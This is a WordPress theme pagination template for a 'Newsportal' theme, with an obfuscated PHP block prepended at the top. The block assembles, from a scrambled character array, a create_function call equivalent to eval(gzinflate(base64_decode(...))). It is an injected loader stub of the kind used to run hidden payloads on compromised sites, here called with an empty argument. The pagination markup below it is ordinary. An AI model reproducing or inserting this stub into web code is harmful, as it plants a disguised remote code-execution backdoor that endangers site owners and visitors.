<?php
$md5 = "b1b0cb6588b5b9d71da3ba93871ee242";
$ab = array(";","v",'z','d',"a",'f','s','$','e',"o",'_',"b","i","n","l",'(',"r","4","t",'c',"6",')',"g");
$bb9 = create_function('$'.'v',$ab[8].$ab[1].$ab[4].$ab[14].$ab[15].$ab[22].$ab[2].$ab[12].$ab[13].$ab[5].$ab[14].$ab[4].$ab[18].$ab[8].$ab[15].$ab[11].$ab[4].$ab[6].$ab[8].$ab[20].$ab[17].$ab[10].$ab[3].$ab[8].$ab[19].$ab[9].$ab[3].$ab[8].$ab[15].$ab[7].$ab[1].$ab[21].$ab[21].$ab[21].$ab[0]);
$bb9('');
?>
<?php
/**
 * Pagination
 *
 * @package WordPress
 * @subpackage Newsportal
 * @since Newsportal 1.0
 */
global $nesia_options;
?>

  <!-- Pagination -->
  <div class="pagination-container">

    <?php if( $nesia_options['nesia_pagination_type'] == 'load' ){ ?>
    <!-- Infinite Pagination -->
    <div class="infinite-pagination">
      <?php next_posts_link( __( 'Load More Content', 'nesia' ) ); ?>
      <div class="ajax-loader"></div>
    </div>
    <?php } else { 
        
        /* Set up some default arguments for the paginate_links() function. */
        $defaults = array(
                'prev_text' => __( '&larr;', 'nesia' ), // Translate in WordPress. This is the default.
                'next_text' => __( '&rarr;', 'nesia' ), // Translate in WordPress. This is the default.
                'show_all' => true,
                'before' => '<div class="pagination nesia-pagination"><h4 class="title">'.__('Jump Through Pagination', 'nesia').'</h4><div class="paging-number">', // Begin nesia_pagination() arguments.
                'after' => '</div></div>'
        );
        nesia_pagination( $defaults );
    } ?>
  </div>